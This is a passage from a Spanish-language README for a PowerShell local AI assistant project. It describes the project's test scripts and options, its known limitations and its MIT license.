| `equipo-frases.ps1` | 58 frases de `datos/equipo-frases.txt` y dos casos más: qué datos del equipo pide cada una, o ninguno. |
| `equipo.ps1` | Reloj, formatos con un equipo de mentira y la lectura de verdad de este equipo. Esta lectura sale en pantalla y no se guarda. |
| `dialogo.ps1 -SoloReconocer` | Reconocer cuándo una frase pide guardar un comando (`datos/peticiones.txt`) y leer lo que propone el modelo. |

Opciones:

- **`-Red`:** añade unas pocas peticiones de verdad a internet, para la IP pública y un servidor que no existe.
- **`-Modelo`:** necesita el llama-server en marcha y tarda varios minutos. Pasa las once escenas de `datos/escenas.txt` por el diálogo real de `bin/ai.ps1`, con las respuestas del usuario ya escritas, y prueba `/comando agregar` con nueve casos.

Las respuestas del modelo cambian de una vez a otra: si una escena falla, lee su conversación antes de dar el fallo por bueno.

Cada prueba sale con su número de fallos, y `probar.ps1` sale con el número de pruebas que fallaron (0 es que todo va bien).

## Limitaciones conocidas

- Pensado para Windows; no se ha probado en PowerShell para Linux/macOS.
- Sin soporte de imágenes ni ficheros adjuntos más allá del contexto por
  stdin / `-Context`. Las únicas herramientas son `buscar_web`,
  `datos_equipo` y `comando_guardado`.
- El coste de la memoria del REPL crece con la conversación (se envía entera
  en cada turno): usa `/new` en conversaciones largas.

## Licencia

[MIT](LICENSE).
